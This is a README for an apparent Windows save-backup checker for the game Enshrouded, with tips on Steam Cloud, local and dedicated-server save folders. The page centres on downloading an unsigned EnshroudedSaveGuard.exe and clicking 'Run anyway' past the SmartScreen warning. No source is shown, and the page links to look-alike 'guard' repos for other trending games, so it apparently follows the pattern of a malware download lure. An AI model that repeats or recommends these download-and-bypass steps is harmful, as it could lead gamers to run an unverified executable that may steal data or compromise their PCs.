<p align="center">
  <img src="https://i.postimg.cc/SQfJZLN6/banner.png" alt="Enshrouded World Migration Guard — 1.0 Save Conversion & Server Backup Checks for Windows" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Save%20Migration%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-enshrouded--save--guard--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Enshrouded World Migration Guard — 1.0 Save Conversion & Server Backup Checks for Windows

**Enshrouded 1.0 world conversion failing on an Early Access save? Dedicated server world missing after an update, or unsure where Steam Cloud stores your character vs. world files? Preserve an untouched pre-migration copy before retrying.**

Enshrouded World Migration Guard focuses on preventing permanent progress loss during Early Access to 1.0 save conversions: **Steam Cloud saves live inside `Steam\userdata\<AccountID>\1203620\remote`**, local fallback saves live in `Saved Games\Enshrouded`, and dedicated servers store world state separately in `EnshroudedServer\savegame`.

This project is aimed at **Enshrouded on Windows PC (Steam and Dedicated Servers)**. It concerns save directory discovery, separating world vs. character files, and pre-conversion backups—not manual save editing.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Early Access world fails 1.0 conversion | Pre-1.0.1.0 conversion bug or retrying on an already half-converted save | Update to Patch `1.0.1.0`+ and retry from an untouched pre-1.0 backup |
| Dedicated server world missing after update | Server `EnshroudedServer\savegame` overwritten or client/server build mismatch | Separate server world files from client character saves and match builds |
| Confusion between `Steam\userdata` and `Saved Games` | Steam Cloud writes to `userdata\<ID>\1203620\remote` while local uses `Saved Games` | Inspect both locations and check timestamps before copying |
| Multiplayer client cannot join hosted 1.0 world | Client or dedicated server running mismatched patch versions | Verify identical Steam build IDs on host and all clients |

## Download for Windows

[**Download EnshroudedSaveGuard.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/EnshroudedSaveGuard.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `EnshroudedSaveGuard.exe`? (Automatic checks in ~2 seconds)

- Detects all three Enshrouded save locations: `Steam\userdata\<ID>\1203620\remote`, `Saved Games\Enshrouded`, and `EnshroudedServer\savegame`.
- Lists world and character files with exact byte sizes and timestamps so you never back up the wrong folder.
- Flags zero-byte (`0 KB`) or incomplete world index files prior to 1.0 conversion.
- Verifies whether a dedicated server installation exists in your Steam libraries.

### Sample Diagnostic Output

```text
[EnshroudedSaveGuard] Scanning Steam Cloud, Saved Games & Dedicated Server paths...
[OK]   Steam Cloud Dir  : C:\Program Files (x86)\Steam\userdata\41299104\1203620\remote (12 files)
[INFO] Local SavedGames : C:\Users\Player\Saved Games\Enshrouded (2 legacy files)
[OK]   Dedicated Server : D:\SteamLibrary\steamapps\common\EnshroudedServer\savegame (8 files)
[OK]   Integrity Check  : All world and character files > 0 KB
```

The release ZIP is named `EnshroudedSaveGuard.zip`; the Windows executable inside is named `EnshroudedSaveGuard.exe`.

1. Close Enshrouded before moving or checking game files.
2. Click **Download EnshroudedSaveGuard.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `EnshroudedSaveGuard.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Enshrouded and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit), a Steam or Dedicated Server installation of Enshrouded, and write access to a backup folder.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `EnshroudedSaveGuard.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### Early Access world fails to convert to Enshrouded 1.0

Keen Games issued post-1.0 patches (including `1.0.1.0`) fixing save-conversion edge cases. Retrying conversion on an already partially converted file can compound errors—always restore from a clean pre-1.0 backup after updating.

### Dedicated server world missing or reset after update

On dedicated servers, world progression lives inside `EnshroudedServer\savegame\` while individual character progression lives on each player's local client. Updating the server without backing up `savegame\` risks overwriting the active world slot.

### Confusion between `Steam\userdata` and `Saved Games`

When Steam Cloud is enabled, active saves reside in `userdata\<AccountID>\1203620\remote`, whereas `Saved Games\Enshrouded` holds local/non-cloud profiles. Checking the wrong directory leads to backing up outdated files.

### Multiplayer client cannot join hosted 1.0 world

Client and server game builds must match after hotfixes; version mismatches can make a valid 1.0 world appear unavailable.

## Where Enshrouded files normally belong

On Windows, Enshrouded saves appear in up to three locations depending on Steam Cloud and server hosting:

```text
%ProgramFiles(x86)%\Steam\userdata\<AccountID>\1203620\remote\
```

Inside that structure, key files and subdirectories typically look like this:

```text
Steam\userdata\<AccountID>\1203620\remote\   (Steam Cloud active)
%USERPROFILE%\Saved Games\Enshrouded\           (Local / Cloud-off)
EnshroudedServer\savegame\                      (Dedicated Server world)
```

Never rename Early Access save extensions manually to match 1.0 filenames; let the updated game binary perform the conversion on a duplicate copy.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Exit Enshrouded and stop any running Dedicated Server cleanly.** Wait until disk writes finish and Steam Cloud sync completes before copying files.
2. **Locate all active save directories.** Check `Steam\userdata\<AccountID>\1203620\remote`, `%USERPROFILE%\Saved Games\Enshrouded`, and `EnshroudedServer\savegame`.
3. **Create a dated offline backup before 1.0 conversion.** Copy the entire directory to `Documents\Enshrouded-Pre1.0-Backup\` and keep it untouched.
4. **Apply the latest Keen Games patch.** Open **Steam → Library → Enshrouded → Properties → Updates** and install Patch `1.0.1.0` or newer.
5. **Retry migration on a working copy.** If a previous conversion failed, restore your clean pre-1.0 files into the active folder and launch the updated build.
6. **Verify client and dedicated server versions match.** Confirm both the server binary and all connecting clients run the same build number.
7. **Keep rolling dated snapshots.** Maintain separate dated copies before major server updates or world resets.

### Before moving any files

Never overwrite your only pre-1.0 Early Access backup during recovery tests. Always copy files rather than moving your sole remaining archive.

## What an effective diagnostic report should tell you

A complete save audit locates **all Steam Cloud, local `Saved Games`, and Dedicated Server save directories**, lists file sizes and modified timestamps, and flags zero-byte files before you run a 1.0 migration.

## FAQ

**Where are Enshrouded Steam Cloud saves stored on Windows?**

Inside your Steam installation folder at `userdata\<AccountID>\1203620\remote\`.

**Where are Enshrouded dedicated server world files stored?**

Inside the server installation folder under `EnshroudedServer\savegame\`.

**Does backing up a dedicated server world also back up player characters?**

No. Character progression is stored client-side on each player's PC; players should back up their own local saves separately.

**What should I do if 1.0 save migration failed before the latest patch?**

Update Enshrouded to the newest patch, restore your untouched pre-1.0 backup copy into the save directory, and let the updated game convert it again.

**Can this tool convert Early Access saves without the game?**

No. Only the official Enshrouded 1.0 executable performs world format conversion.

**Are any save files or game binaries bundled here?**

No copyrighted game assets, server binaries, or save files are distributed by this repository.

## Useful reading

- [Enshrouded on Steam](https://store.steampowered.com/app/1203620/Enshrouded/)
- [Official Enshrouded News & Patch Notes](https://enshrouded.com/en-US/news)

## More Windows Game Diagnostic Tools

- [Subnautica2-CoopSaveSentinel](../Subnautica2-CoopSaveSentinel) — Subnautica 2 co-op world save & `~mods` sentinel
- [Palworld-WorldSaveSentinel](../Palworld-WorldSaveSentinel) — Palworld `Level.sav` & `backup\world` snapshot sentinel
- [MoonSweepers-SaveVault](../MoonSweepers-SaveVault) — Moon Sweepers 1.0.6 world backup & version guard
- [Anno117-PaxRomanaSaveGuard](../Anno117-PaxRomanaSaveGuard) — Anno 117: Pax Romana `Documents` & OneDrive save guard

*Independent community project. Not affiliated with Keen Games, Valve, or Steam. All trademarks belong to their respective owners.*
 
 
 
 
 
